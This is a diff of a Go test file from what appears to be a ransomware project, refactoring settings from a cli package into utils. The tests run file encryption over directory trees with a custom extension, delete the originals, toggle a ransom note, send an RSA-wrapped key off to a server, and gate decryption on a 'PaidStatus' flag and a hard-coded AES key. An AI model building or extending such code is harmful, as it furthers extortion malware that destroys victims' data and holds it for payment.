@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
-	"main/src/cli"
 	wcc_crypto "main/src/crypto"
 	"main/src/utils"
 	"os"
@@ -15,9 +14,9 @@ import (
 
 func createRecursiveFileHierarchy(t *testing.T) ([]string, string) {
 	testDir := t.TempDir()
-	cli.Settings.EncryptedFileExt = "kc"
-	cli.Settings.LeaveNote = false
-	cli.Settings.RawKey = true
+	utils.Settings.EncryptedFileExt = "kc"
+	utils.Settings.LeaveNote = false
+	utils.Settings.RawKey = true
 	fileName := testDir + "/_testFile"
 	testString := "This is a test string"
 	c := 3
@@ -94,7 +93,7 @@ func TestEncryptionDecryptionScheme(t *testing.T) {
 		}
 	}
 	var eQue utils.Queue
-	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
+	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
 	eQue.Init(eFiles)
 	StartDecryption(&eQue, key)
 	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
@@ -118,7 +117,7 @@ func TestEncryptionDecryptionSchemeWithDeletion(t *testing.T) {
 	var dQue utils.Queue
 	// key := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
 	dQue.Init(files)
-	cli.Settings.Delete = true
+	utils.Settings.Delete = true
 	StartEncryption(&dQue, key)
 	for _, f := range files {
 		_, b := os.Stat(f)
@@ -127,7 +126,7 @@ func TestEncryptionDecryptionSchemeWithDeletion(t *testing.T) {
 		}
 	}
 	var eQue utils.Queue
-	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
+	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
 	eQue.Init(eFiles)
 	StartDecryption(&eQue, key)
 	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
@@ -154,9 +153,9 @@ func TestEncryptionDecryptionSchemeWithDeletionSendOff(t *testing.T) {
 	var dQue utils.Queue
 	// key := "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
 	dQue.Init(files)
-	cli.Settings.Delete = true
-	cli.Settings.RawKey = false
-	cli.Settings.PaidStatus = true
+	utils.Settings.Delete = true
+	utils.Settings.RawKey = false
+	utils.Settings.PaidStatus = true
 	StartEncryption(&dQue, key)
 	for _, f := range files {
 		_, b := os.Stat(f)
@@ -165,7 +164,7 @@ func TestEncryptionDecryptionSchemeWithDeletionSendOff(t *testing.T) {
 		}
 	}
 	var eQue utils.Queue
-	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
+	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
 	eQue.Init(eFiles)
 	StartDecryption(&eQue, key)
 	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
@@ -193,7 +192,7 @@ func TestSendoffAndReceiveKey(t *testing.T) {
 	pubKeyBytes, _ := hex.DecodeString(key)
 	pubKey := string(pubKeyBytes)
 	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
-	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus, false)
+	success, err := utils.SendOffKey(encryptedString, hash, utils.Settings.PaidStatus, false)
 	if err != nil {
 		t.Error(err.Error())
 	}
@@ -220,7 +219,7 @@ func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
 	pubKeyBytes, _ := hex.DecodeString(key)
 	pubKey := string(pubKeyBytes)
 	encryptedString, _ := wcc_crypto.EncryptWithRSAPublicKey([]byte(testString), pubKey)
-	success, err := utils.SendOffKey(encryptedString, hash, cli.Settings.PaidStatus, false)
+	success, err := utils.SendOffKey(encryptedString, hash, utils.Settings.PaidStatus, false)
 	if err != nil {
 		t.Error(err.Error())
 	}
@@ -241,12 +240,12 @@ func TestSendoffAndReceiveKeyNotPaid(t *testing.T) {
 func TestOfflineDecryption(t *testing.T) {
 	files, rootDir := createRecursiveFileHierarchy(t)
 	var dQue utils.Queue
-	cli.Settings.SuppliedAESKey = "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
+	utils.Settings.SuppliedAESKey = "645267556B58703273357638792F423F4528472B4B6250655368566D59713374"
 	dQue.Init(files)
-	cli.Settings.Delete = true
-	cli.Settings.RawKey = false
-	cli.Settings.PaidStatus = true
-	cli.Settings.OfflineMode = true
+	utils.Settings.Delete = true
+	utils.Settings.RawKey = false
+	utils.Settings.PaidStatus = true
+	utils.Settings.OfflineMode = true
 	StartEncryption(&dQue, key)
 	for _, f := range files {
 		_, b := os.Stat(f)
@@ -255,10 +254,10 @@ func TestOfflineDecryption(t *testing.T) {
 		}
 	}
 	var eQue utils.Queue
-	eFiles := wcc_crypto.GetFilesInCurrentDir(cli.Settings.EncryptedFileExt, rootDir, true)
+	eFiles := wcc_crypto.GetFilesInCurrentDir(utils.Settings.EncryptedFileExt, rootDir, true)
 	eQue.Init(eFiles)
 	// prepare decrypted key
-	ioutil.WriteFile("./d_key.txt", []byte(cli.Settings.SuppliedAESKey), 0777)
+	ioutil.WriteFile("./d_key.txt", []byte(utils.Settings.SuppliedAESKey), 0777)
 	StartDecryption(&eQue, key)
 	finalFiles := wcc_crypto.GetFilesInCurrentDir("txt", rootDir, true)
 	for _, ff := range files {
